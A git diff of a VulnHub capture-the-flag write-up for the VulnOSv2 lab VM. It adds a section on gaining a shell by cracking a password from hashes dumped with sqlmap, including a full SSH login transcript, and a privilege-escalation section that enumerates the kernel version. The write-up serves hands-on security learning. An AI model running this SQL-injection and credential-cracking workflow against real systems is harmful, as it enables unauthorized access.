@@ -38,7 +38,7 @@ MAC Address: 08:00:27:57:4F:AA (Oracle VirtualBox virtual NIC)
 Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-checking port 80 shows a basic website :
+Checking port 80 shows a basic website :
 
 ![mainPage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/378a7c15-24ab-4726-9a9e-d20150ac6047)
 
@@ -206,14 +206,57 @@ root@kali: sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php/?q=1&add_value
 +----+--------------------+-------------+----------------------------------+----------+-----------+------------+------------+---------------+
 ```
 
-perfect, we now have the hashes, i just go for `webmin` user to crack the hash using an online tool
+## 3.Gainig Shell
+
+Perfect, we now have the hashes, i just go for `webmin` user to crack the hash using an online tool
 
 and i got the cracked hash as `webmin1980` and immediately checked SSH to connect.
 
 ```text
+root@kali: ssh webmin@192.168.56.104
 
+The authenticity of host '192.168.56.104 (192.168.56.104)' can't be established.
+ED25519 key fingerprint is SHA256:7FO0Y5C+W/hj0ShAjGy33uQvuMRPrSNk82jGy/wxnfY.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.56.104' (ED25519) to the list of known hosts.
+webmin@192.168.56.104's password:
+Welcome to Ubuntu 14.04.4 LTS (GNU/Linux 3.13.0-24-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Tue Sep 26 08:35:28 CEST 2023
+
+  System load: 0.08              Memory usage: 2%   Processes:       62
+  Usage of /:  5.9% of 29.91GB   Swap usage:   0%   Users logged in: 0
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+
+Last login: Mon Sep 25 12:04:19 2023 from 192.168.56.101
+$ id
+uid=1001(webmin) gid=1001(webmin) groups=1001(webmin)
 ```
 
+## 4.Privilege Escalation
+
+Just check the kernel version and you find an exploit for it :
+
+```text
+$ uname -a
+Linux VulnOSv2 3.13.0-24-generic #47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014 i686 i686 i686 GNU/Linux
+
+$ cat /etc/os-release
+NAME="Ubuntu"
+VERSION="14.04.4 LTS, Trusty Tahr"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 14.04.4 LTS"
+VERSION_ID="14.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+```
 
 
 
